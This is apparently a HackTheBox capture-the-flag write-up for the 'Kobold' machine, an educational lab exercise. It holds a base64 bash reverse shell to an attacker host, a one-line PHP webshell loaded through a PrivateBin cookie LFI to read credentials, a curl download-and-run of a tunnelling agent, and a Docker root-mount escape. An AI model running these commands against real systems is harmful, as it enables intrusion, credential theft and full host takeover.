🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Kobold — HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2ff7f3683782c3525c5ac9ed275cc989.png" width="120"/>
<div>

**Difficulty**: Easy  
**OS**: Linux  
**Type**: Web / Docker  

</div>
</div>

---

## Attack Chain Summary

```
nmap → kobold.htb
  → ffuf → mcp.kobold.htb + bin.kobold.htb
  → CVE-2026-23744 (MCPJam RCE) → shell ben
  → CVE-2025-49596 (PrivateBin LFI via cookie template)
  → Credential extraction (conf.php)
  → Arcane Admin Access
  → Docker container creation (root mount)
  → ROOT
```

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC 10.129.xxx.xxx -oN scan.txt
```

Open ports:

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu |
| 80   | HTTP    | nginx 1.24.0 (redirect → HTTPS) |
| 443  | HTTPS   | nginx 1.24.0 — `kobold.htb` |

The TLS certificate reveals the domain `kobold.htb` and the wildcard `*.kobold.htb`.

### Adding to /etc/hosts

```bash
echo "10.129.xxx.xxx kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

### Subdomain Discovery (ffuf)

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://10.129.xxx.xxx \
  -H "Host: FUZZ.kobold.htb" \
  -k -mc 200,301,302,403 -fs 154
```

Result:
```
mcp   [Status: 200, Size: 466]
```

- `mcp.kobold.htb` → MCPJam Inspector

---

## Foothold — CVE-2026-23744 (MCPJam RCE)

### Version Identification

Visiting `https://mcp.kobold.htb` → Settings → **MCPJam Version: v1.4.2**

This version is vulnerable to **CVE-2026-23744**: the `/api/mcp/connect` endpoint arbitrarily executes commands passed in the `command` field with no authentication check.

### Exploitation

**Listener:**
```bash
nc -lvnp 4444
```

**Reverse shell payload (base64):**
```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64

curl -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "echo <BASE64> | base64 -d | bash"],
      "env": {}
    },
    "serverId": "pwn"
  }'
```

Shell obtained as `ben`.

---

## User Flag

```bash
ben@kobold:~$ cat user.txt
********************************
```

---

## Post-Exploitation Enumeration

### Key Information

```bash
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

cat /etc/group | grep docker
# docker:x:111:alice

ss -tlnp
# 127.0.0.1:8080  → PrivateBin (Docker container)
# 127.0.0.1:6274  → MCPJam Inspector
# *:3552          → Arcane (Docker manager)
```

### Nginx — Internal Subdomains

```bash
cat /etc/nginx/sites-enabled/*
```

- `bin.kobold.htb` → proxy to `127.0.0.1:8080` (PrivateBin in Docker)
- `mcp.kobold.htb` → proxy to `127.0.0.1:6274` (MCPJam)

### operator Group — Access to /privatebin-data

```bash
find / -group operator -readable 2>/dev/null
```

The `operator` group (which `ben` belongs to) grants read/write access to `/privatebin-data/data/` (`drwxrwxrwx`).

---

## Privesc 1 — CVE-2025-49596 (PrivateBin LFI via cookie template)

### Context

PrivateBin **2.0.2** with `templateselection = true` in the config. CVE-2025-49596 exploits the `template` cookie to arbitrarily include PHP files via a relative path traversal from the `tpl/` folder.

### Writing a Webshell

From the `ben` shell, write a PHP webshell to the world-writable folder:

```bash
echo '<?php system($_GET["cmd"]); ?>' > /privatebin-data/data/shell.php
```

### Triggering the LFI

```bash
curl -sk --cookie "template=../data/shell" \
  "https://bin.kobold.htb/?cmd=id"
# → uid=65534(nobody) gid=82(www-data) groups=82(www-data)
```

The webshell works within the PrivateBin container context.

### Credential Extraction

```bash
curl -sk --cookie "template=../data/shell" \
  "https://bin.kobold.htb/?cmd=cat+/srv/cfg/conf.php"
```

In the PrivateBin config, a commented-but-active MySQL section contains:

```ini
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
usr = "privatebin"
pwd = "ComplexP@ssword********"
```

---

## Privesc 2 — Arcane Admin Access

### Ligolo-ng Tunnel

Port 3552 (Arcane) is only accessible from localhost. We set up a tunnel:

**Kali:**
```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

**ben shell:**
```bash
cd /tmp
curl http://<ATTACKER_IP>:8080/agent -o agent && chmod +x agent
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

**Ligolo CLI:**
```
session → start
listener_add --addr 0.0.0.0:3552 --to 127.0.0.1:3552 --tcp
```

### Arcane Login

Access `http://127.0.0.1:3552` in the browser.

```
Username: arcane
Password: ComplexP@ssword********
```

Interface: **Arcane v1.13.0** — Docker manager with access to the `unix:///var/run/docker.sock` socket.

---

## Privesc 3 — Docker Escape → ROOT

### Creating the Malicious Container

In Arcane → Containers → **Create Container**:

**Basic:**
- Container Name: `pwn`
- Image: `privatebin/nginx-fpm-alpine:2.0.2` (already available locally)
- User: `root`
- I/O: Allocate TTY, Attach stdin

**Volumes (Text Format):**
```
/:/hostfs
```

**Network & Security:**
- Privileged mode

### Retrieving the Root Flag

From the Arcane built-in shell (Shell tab of the container):

```sh
/var/www # whoami
root
/var/www # cat /hostfs/root/root.txt
********************************
```
